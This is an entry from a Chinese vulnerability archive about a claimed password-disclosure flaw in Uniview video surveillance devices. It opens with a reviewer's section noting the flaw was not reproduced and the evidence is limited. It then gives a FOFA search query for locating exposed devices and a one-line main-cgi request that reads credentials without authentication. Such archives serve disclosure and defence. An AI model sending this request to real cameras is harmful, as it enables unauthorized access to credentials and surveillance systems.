---
source: "wy876 漏洞文库"
id: "vw-eeaeebc18414f25e6e795576"
entity_id: "ve-eeaeebc18414f25e6e795576"
schema_version: "1"
title: "浙江宇视科技视频监控main-cgi密码泄露漏洞"
product: "Uniview网络视频设备"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "空用户名/-1句柄，机型固件未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7main-cgi%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bky3gsuwp052gmtn"
source_status: "recorded"
---

# 浙江宇视科技视频监控main-cgi密码泄露漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Uniview网络视频设备
- 本文讨论：main-cgi cmd255 loginHandle=-1凭据读取
- 版本、权限与配置前提：空用户名/-1句柄，机型固件未知
- 资料类型：信息泄露接口线索；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 只有未编码JSON URL，无响应或凭据类型，不足证实任意账号密码泄露
- 摄像机与视频监控泛称需精确产品；无原始公告/修复

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- cmd语义、设备范围与认证待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


### 一、漏洞描述
<font style="color:rgb(62, 62, 62);">宇视(Uniview)高清网络摄像机是一种高性能的网络摄像机，它可以通过网络进行视频传输和监控。该摄像机采用先进的视频技术，具有高清晰度、低照度、宽动态等特点，能够提供高质量的视频图像。该系统main-cgi接口处存在信息泄露漏洞，可以获取账号密码</font>

### 二、影响版本
uniview-视频监控

### 三、资产测绘
fofa：app="uniview-视频监控"

特征：


### 四、漏洞复现
```plain
/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bky3gsuwp052gmtn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
